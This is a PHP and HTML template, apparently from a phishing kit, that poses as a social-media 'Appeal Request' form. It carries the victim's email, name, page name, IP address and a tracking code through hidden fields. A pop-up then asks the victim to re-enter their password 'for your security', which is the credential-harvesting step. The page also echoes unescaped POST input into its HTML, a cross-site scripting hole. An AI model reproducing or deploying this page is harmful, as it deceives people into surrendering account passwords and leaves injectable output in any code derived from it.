<?php 
    ...
    $ipja = isset($_POST['ipAddress']) ? $_POST['ipAddress'] : 'ipaddress'; 
    $randomCode =isset($_POST['randomCodi']) ? $_POST['randomCodi'] : 'XXX'; 

    $emaili = isset($_POST['emaili']) ? $_POST['emaili'] : 'emaili';   
    $emri = isset($_POST['emri']) ? $_POST['emri'] : 'emri';   
    $pagename = isset($_POST['pagename']) ? $_POST['pagename'] : 'pagename';   
    $infoja = isset($_POST['infoja']) ? $_POST['infoja'] : 'infoja';  
    $passwordi = isset($_POST['passwordi']) ? $_POST['passwordi'] : 'passwordi';
?>
...
<html lang="en">
  <head>
    ...
    <title>Appeal Request [authenticate]</title>
                  ...
                  <div class="col-10 col-md-11 coliwithoutpadding" style="padding-left: 0px;">
                    <div class="ourmessage">
                      ...
                      <div class="form-group" id="appeali">
                        ...
                        <input type="text" required class="form-control" id="emailiAuth" name="emailiAuth" aria-describedby="emailHelp" value="<?php echo $emaili; ?>">
                      </div>
                      <div class="form-group">
                        <label for="emri">Your Name (Name and Surname)</label>
                        <input type="text" required class="form-control" id="emriAuth" name="emriAuth" aria-describedby="emailHelp" value="<?php echo $emri; ?>">
                      </div>
                        <div class="form-group">
                          <label for="pagename">Page Name</label>
                          <input type="text" required class="form-control" id="pagenameAuth" name="pagenameAuth" aria-describedby="emailHelp" value="<?php echo $pagename; ?>">
                      </div>
                      <div class="form-group">
                        <label for="info">Additional info</label>
                        <textarea class="form-control" id="infojaAuth" name="infojaAuth" aria-describedby="emailHelp"><?php echo $infoja; ?></textarea>
                      </div>
                      ...
                      <input type="hidden" id="ipja" name="ipja" value="<?php echo $ipja; ?>">
                      <input type="hidden" id="randomCodi" name="randomCodi" value="<?php echo $randomCode; ?>">

                      <button type="submit" class="btn butoniappeal" name="firstSubmit" id="firstSubmit" onclick="return openModal();">Submit</button>                     
    ...
    <div class="modal-content">
      ...
      <div class="modal-body">          
        <p class="lbcus">For your security, you must re-enter your password to continue.</p>
          <div class="form-group"><label for="passwordi" class="lbcus mb-2">Password</label>
            <input type="password" required class="form-control pw739" name="passwordi" id="passwordi">
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary clsbtn" data-dismiss="modal">Close</button>
          <input type="submit" class="btn btn-primary fmcsmbtn" value="Continue" name="modalbutton" id="modalbutton">
        </div>
    </div>
</form>
</div></div>
